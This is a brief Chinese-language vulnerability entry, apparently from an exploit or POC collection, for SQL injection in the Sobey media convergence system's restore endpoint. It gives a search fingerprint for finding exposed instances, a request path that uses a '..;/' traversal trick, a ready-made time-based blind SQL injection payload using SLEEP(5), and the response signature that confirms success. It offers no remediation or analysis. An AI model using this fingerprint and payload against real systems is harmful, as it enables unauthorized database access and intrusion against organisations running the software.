# 索贝融媒体系统restore存在SQL注入漏洞

索贝融媒体系统 ｜ SQL注入 ｜ —
- **指纹**：`app="SOBEY-融媒体"`
- **请求**：`POST /sobey-mchEditor/mch/WXArticleInt/js/..;/restore HTTP/1.1`

**Payload**
```
token=&siteCode=1&id=1 AND (SELECT 2804 FROM (SELECT(SLEEP(5)))MDfc)
```
- **响应特征**：200 5s